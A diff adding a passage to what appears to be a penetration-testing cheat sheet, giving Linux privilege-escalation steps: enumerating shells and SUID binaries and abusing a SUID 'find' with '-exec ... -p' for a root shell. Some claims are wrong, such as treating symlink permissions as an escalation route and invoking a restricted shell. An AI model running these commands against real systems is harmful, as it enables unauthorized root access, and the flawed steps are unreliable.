@@ -2746,6 +2746,17 @@ sudo man ls
 	!/bin/bash
 ```
 
+**Another way**:
+We will start by checking the shells available on the system using the command: `cat /etc/shells`.
+
+To check the permissions each shell has, use the command: `cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done`.
+- We search for the shell with the permission `lrwxrwxrwx` to escalation
+
+`find / -perm -4000 2>/dev/null`
+- Search for execuable that run with the SetUID permission bit set.
+- Example `find` is the command that the setUID permission bit set 
+  - `find / -exec /bin/rbash -p \; -quit` -> Execute the bash with `find` -> We will able to escalate to root
+
 ### Win Persistence
 
 ```bash
